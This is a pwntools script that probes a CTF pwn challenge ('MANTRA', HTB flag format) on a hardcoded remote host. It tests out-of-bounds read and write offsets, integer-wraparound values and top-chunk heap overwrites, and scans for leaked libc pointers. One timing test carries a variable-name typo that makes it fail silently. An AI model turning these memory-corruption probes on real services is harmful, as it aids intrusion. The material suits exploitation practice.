#!/usr/bin/env python3
"""
Test exploitation theories on live server
Focus on finding any viable path to exploitation
"""
from pwn import *
import struct
import time

context.log_level = 'info'

REMOTE_HOST = '154.57.164.75'
REMOTE_PORT = 30444

def test_extreme_offsets():
    """Test very large and very small offsets that might wrap around"""
    print("\n" + "="*60)
    print("TESTING EXTREME OFFSETS (potential wraparound)")
    print("="*60)

    # Test offsets that might cause integer overflow wraparound
    test_offsets = [
        # Very negative (might wrap to high addresses)
        -1000000000000,
        -10000000000,
        -100000000,
        -1000000,
        -10000,

        # Near signed/unsigned boundaries
        2**31 - 1,      # 0x7fffffff
        2**31,          # 0x80000000
        2**32 - 1,      # 0xffffffff
        2**32,          # 0x100000000
        2**63 - 1000,   # Near 64-bit max
        2**63 + 1000,

        # Very large positive
        1000000,
        100000000,
        10000000000,
    ]

    for offset in test_offsets:
        try:
            io = remote(REMOTE_HOST, REMOTE_PORT, timeout=5)
            io.sendlineafter(b'> ', b'1')
            io.sendlineafter(b'string: ', b'100')
            io.sendlineafter(b'> ', b'2')
            io.sendlineafter(b'tie? ', b'1')
            io.sendlineafter(b'glyphs): ', b'TESTTEST')
            io.sendlineafter(b'> ', b'4')
            io.sendlineafter(b'recite? ', str(offset).encode())
            io.recvuntil(b'speaks: [')
            data = io.recvuntil(b']', drop=True)

            if len(data) == 8 and any(b != 0 for b in data):
                print(f"‚úÖ Non-zero at offset {offset}: {data.hex()}")
            elif b'HTB{' in data or b'flag' in data.lower():
                print(f"üéâ FLAG FOUND at offset {offset}: {data}")
                return True
            else:
                print(f"‚úì Offset {offset}: all zeros")

            io.close()

        except Exception as e:
            print(f"‚ùå Offset {offset}: Error - {e}")

    return False

def test_magic_values():
    """Test writing magic values that might trigger behavior"""
    print("\n" + "="*60)
    print("TESTING MAGIC VALUES")
    print("="*60)

    magic_values = [
        (b'HTB{FLAG}', 'HTB flag format'),
        (b'FLAGHERE', 'FLAGHERE'),
        (b'whispers', 'Hint word: whispers'),
        (b'sacredxx', 'Hint word: sacred'),
        (b'prayerxx', 'Hint word: prayer'),
        (b'\xff\xff\xff\xff\xff\xff\xff\xff', 'All 0xFF'),
        (b'\x00\x00\x00\x00\x00\x00\x00\x00', 'All 0x00'),
        (struct.pack('<Q', 0xdeadbeefcafebabe), 'Magic value 0xdeadbeefcafebabe'),
    ]

    for value, desc in magic_values:
        try:
            io = remote(REMOTE_HOST, REMOTE_PORT, timeout=5)
            io.sendlineafter(b'> ', b'1')
            io.sendlineafter(b'string: ', b'100')
            io.sendlineafter(b'> ', b'2')
            io.sendlineafter(b'tie? ', b'1')
            io.sendlineafter(b'glyphs): ', b'TESTTEST')

            # Write the magic value
            io.sendlineafter(b'> ', b'3')
            io.sendlineafter(b'retie? ', b'0')
            io.sendlineafter(b'glyphs): ', value)

            # Try to read it back
            io.sendlineafter(b'> ', b'4')
            io.sendlineafter(b'recite? ', b'0')
            io.recvuntil(b'speaks: [')
            data = io.recvuntil(b']', drop=True)

            if data == value:
                print(f"‚úÖ {desc}: written and read back successfully")
            elif b'HTB{' in data or b'flag' in data.lower():
                print(f"üéâ FLAG found with {desc}: {data}")
                return True
            else:
                print(f"‚úì {desc}: different response")

            io.close()

        except Exception as e:
            print(f"‚ùå {desc}: Error - {e}")

    return False

def test_offset_sequential():
    """Test reading a sequence of offsets to find patterns"""
    print("\n" + "="*60)
    print("TESTING OFFSET SEQUENCES")
    print("="*60)

    interesting_offsets = []

    # Test offsets 90-110 to map around bead array and top chunk
    for offset in range(90, 111):
        try:
            io = remote(REMOTE_HOST, REMOTE_PORT, timeout=5)
            io.sendlineafter(b'> ', b'1')
            io.sendlineafter(b'string: ', b'100')
            io.sendlineafter(b'> ', b'2')
            io.sendlineafter(b'tie? ', b'1')
            io.sendlineafter(b'glyphs): ', b'TESTTEST')
            io.sendlineafter(b'> ', b'4')
            io.sendlineafter(b'recite? ', str(offset).encode())
            io.recvuntil(b'speaks: [')
            data = io.recvuntil(b']', drop=True)

            if len(data) == 8:
                val = struct.unpack('<Q', data)[0]
                if val != 0:
                    interesting_offsets.append((offset, val))
                    print(f"Offset {offset:3d}: 0x{val:016x}")

            io.close()

        except Exception as e:
            print(f"‚ùå Offset {offset}: {e}")
            break

    if interesting_offsets:
        print(f"\n‚úÖ Found {len(interesting_offsets)} non-zero offsets!")
    else:
        print(f"\n‚ÑπÔ∏è  No interesting data found in range 90-110")

    return interesting_offsets

def test_write_primitive():
    """Test if we can use the write primitive meaningfully"""
    print("\n" + "="*60)
    print("TESTING WRITE PRIMITIVE")
    print("="*60)

    # Try writing to top chunk size and see if we can trigger anything
    test_writes = [
        (101, b'AAAAAAA\n', "Top chunk size area"),
        (102, b'BBBBBBB\n', "Top chunk data 1"),
        (103, b'CCCCCCC\n', "Top chunk data 2"),
        (-1, b'DDDDDDD\n', "Own chunk metadata"),
    ]

    for offset, data, desc in test_writes:
        try:
            io = remote(REMOTE_HOST, REMOTE_PORT, timeout=5)
            io.sendlineafter(b'> ', b'1')
            io.sendlineafter(b'string: ', b'100')
            io.sendlineafter(b'> ', b'2')
            io.sendlineafter(b'tie? ', b'1')
            io.sendlineafter(b'glyphs): ', b'TESTTEST')

            io.sendlineafter(b'> ', b'3')
            io.sendlineafter(b'retie? ', str(offset).encode())
            io.sendlineafter(b'glyphs): ', data)

            print(f"‚úÖ Wrote to {desc} (offset {offset})")

            io.close()

        except Exception as e:
            print(f"‚ùå Failed to write to {desc}: {e}")

def test_timing_analysis():
    """Check if certain operations take different amounts of time"""
    print("\n" + "="*60)
    print("TIMING ANALYSIS")
    print("="*60)

    operations = []

    # Test normal operation
    start = time.time()
    try:
        io = remote(REMOTE_HOST, REMOTE_PORT, timeout=5)
        io.sendlineafter(b'> ', b'1')
        io.sendlineafter(b'string: ', b'100')
        io.sendlineafter(b'> ', b'2')
        io.sendlineafter(b'tie? ', b'1')
        io.sendlineafter(b'glyphs): ', b'TESTTEST')
        io.sendlineafter(b'> ', b'4')
        io.sendlineafter(b'recite? ', b'0')
        io.recvuntil(b'speaks: [')
        io.recvuntil(b']')
        io.close()
        operations.append(("Normal", time.time() - start))
    except:
        operations.append(("Normal", -1))

    # Test with corrupted offset
    start = time.time()
    try:
        io = remote(REMote_HOST, REMOTE_PORT, timeout=5)
        io.sendlineafter(b'> ', b'1')
        io.sendlineafter(b'string: ', b'100')
        io.sendlineafter(b'> ', b'2')
        io.sendlineafter(b'tie? ', b'1')
        io.sendlineafter(b'glyphs): ', b'TESTTEST')
        io.sendlineafter(b'> ', b'4')
        io.sendlineafter(b'recite? ', b'-1')
        io.recvuntil(b'speaks: [')
        io.recvuntil(b']')
        io.close()
        operations.append(("Offset -1", time.time() - start))
    except:
        operations.append(("Offset -1", -1))

    for name, duration in operations:
        if duration > 0:
            print(f"{name:12s}: {duration:.4f}s")
        else:
            print(f"{name:12s}: Failed")

def find_reachable_offsets():
    """Try to find any offsets that give us useful data"""
    print("\n" + "="*60)
    print("SEARCHING FOR REACHABLE OFFSETS")
    print("="*60)

    # Try to find if any libc addresses are reachable
    for base_offset in range(-200, 200, 10):
        try:
            io = remote(REMOTE_HOST, REMOTE_PORT, timeout=5)
            io.sendlineafter(b'> ', b'1')
            io.sendlineafter(b'string: ', b'100')
            io.sendlineafter(b'> ', b'2')
            io.sendlineafter(b'tie? ', b'1')
            io.sendlineafter(b'glyphs): ', b'TESTTEST')
            io.sendlineafter(b'> ', b'4')
            io.sendlineafter(b'recite? ', str(base_offset).encode())
            io.recvuntil(b'speaks: [')
            data = io.recvuntil(b']', drop=True)

            if len(data) == 8:
                val = struct.unpack('<Q', data)[0]
                # Check if it looks like a pointer (high bits set)
                if val >> 40 == 0x7f:  # Likely libc
                    print(f"üéØ Potential libc at offset {base_offset}: 0x{val:016x}")
                    return True
                elif val != 0:
                    print(f"‚ú® Non-zero at offset {base_offset}: 0x{val:016x}")

            io.close()

        except Exception as e:
            print(f"‚ùå Failed at offset {base_offset}: {e}")
            break

    return False

def main():
    print("="*60)
    print("MANTRA - EXPLOITATION THEORY TESTING")
    print(f"Testing against live server: {REMOTE_HOST}:{REMOTE_PORT}")
    print("="*60)

    flag_found = False

    # Test 1: Extreme offsets
    if test_extreme_offsets():
        flag_found = True

    # Test 2: Magic values
    if test_magic_values():
        flag_found = True

    # Test 3: Sequential offsets
    interesting = test_offset_sequential()

    # Test 4: Write primitive
    test_write_primitive()

    # Test 5: Find reachable pointers
    if find_reachable_offsets():
        flag_found = True

    # Test 6: Timing analysis
    test_timing_analysis()

    print("\n" + "="*60)
    if flag_found:
        print("üéâ FLAG FOUND!")
    else:
        print("‚ùå No exploitation path found yet")
    print("="*60)

if __name__ == '__main__':
    main()
